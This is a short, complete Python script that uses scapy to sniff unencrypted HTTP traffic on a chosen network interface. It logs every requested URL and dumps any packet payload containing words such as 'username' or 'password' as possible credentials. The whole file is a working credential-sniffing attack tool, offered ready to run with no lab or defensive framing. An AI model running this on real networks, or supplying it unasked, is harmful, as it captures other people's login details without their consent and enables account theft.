#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
import argparse

def get_url(packet):
    """
    Extracts the full URL from an HTTP request packet.
    """
    host = packet[http.HTTPRequest].Host.decode(errors="ignore")
    path = packet[http.HTTPRequest].Path.decode(errors="ignore")
    return host + path

def get_login_info(packet):
    """
    Searches for common keywords in the raw payload to identify potential credentials.
    """
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = [b"username", b"user", b"login", b"email", b"password", b"pass"]
        for keyword in keywords:
            if keyword in load.lower():
                return load
    return None

def process_sniffed_packet(packet):
    """
    Called for each sniffed packet: prints URL and potential credentials.
    """
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url}")

        login_info = get_login_info(packet)
        if login_info:
            try:
                creds = login_info.decode(errors="ignore")
            except:
                creds = str(login_info)
            print(f"[+] Possible credentials >> {creds}")

def main():
    parser = argparse.ArgumentParser(
        description="HTTP packet sniffer (extracts URLs and potential credentials)"
    )
    parser.add_argument(
        "-i", "--iface",
        dest="iface",
        required=True,
        help="Network interface to sniff on (e.g. eth0)"
    )
    args = parser.parse_args()

    print(f"[*] Starting HTTP sniffer on interface {args.iface}...")
    print("[*] Press CTRL+C to stop.\n")

    try:
        scapy.sniff(
            iface=args.iface,
            filter="tcp port 80",
            store=False,
            prn=process_sniffed_packet
        )
    except KeyboardInterrupt:
        print("\n[!] Sniffer stopped by user.")

if __name__ == "__main__":
    main()
